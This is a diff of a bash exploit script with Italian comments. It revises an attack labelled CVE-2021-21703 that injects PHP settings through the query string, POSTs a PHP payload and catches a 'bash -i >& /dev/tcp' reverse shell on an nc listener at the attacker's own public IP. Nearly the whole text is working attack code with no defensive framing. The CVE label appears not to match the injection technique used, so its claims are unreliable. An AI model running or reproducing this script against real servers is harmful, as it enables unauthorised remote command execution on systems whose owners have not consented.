@@ -5,21 +5,22 @@ MY_IP=$(curl -s ifconfig.me)
 RPORT=4444
 
 clear
-echo "🔥 CVE-2021-21703 → CLEAN SHELL ${MY_IP}:${RPORT}"
+echo "🔥 CVE-2021-21703 → ROOT SHELL ${MY_IP}:${RPORT}"
 
-# 🔥 PAYLOAD PIÙ SEMPLICE (funziona SEMPRE)
-PHP_PAYLOAD='<?php system("bash -i >& /dev/tcp/'${MY_IP}'/'${RPORT}' 0>&1"); ?>'
+# 🔥 PAYLOAD CON printf (espansione garantita)
+printf -v PHP_PAYLOAD '<?php system("bash -i >& /dev/tcp/%s/%d 0>&1"); ?>' "$MY_IP" "$RPORT"
 
-echo "[+] Listener..."
+echo "[+] Listener on ${RPORT}..."
 nc -lvnp ${RPORT} &
 sleep 1
 
-# 🔥 METODO 1: DATA-BINARY PURO (NO URL COMPLESSO)
-curl -k -s -X POST \
-  -H "Expect:" \
-  -H "User-Agent: Mozilla/5.0" \
+# 🔥 CVE CORRETTO (params nel QUERY)
+curl -k -s --max-time 8 \
+  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64)" \
   --resolve "${TARGET_IP}:${TARGET_PORT}:127.0.0.1" \
-  --data-binary "<?php system('bash -c \"bash -i >& /dev/tcp/${MY_IP}/${RPORT} 0>&1\"');?>" \
-  "https://${TARGET_IP}:${TARGET_PORT}/?-dallow_url_include=On+-dauto_prepend_file=php://input" >/dev/null 2>&1
+  "https://${TARGET_IP}:${TARGET_PORT}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input" \
+  --data-binary "$PHP_PAYLOAD" >/dev/null 2>&1
 
-echo -e "\n🎯 SHELL LIVE..."
+echo -e "\n🎯 SHELL CONNECTING... (3s)"
+sleep 3
+echo -e "\n💥 If no shell: Ctrl+C → retry\n"
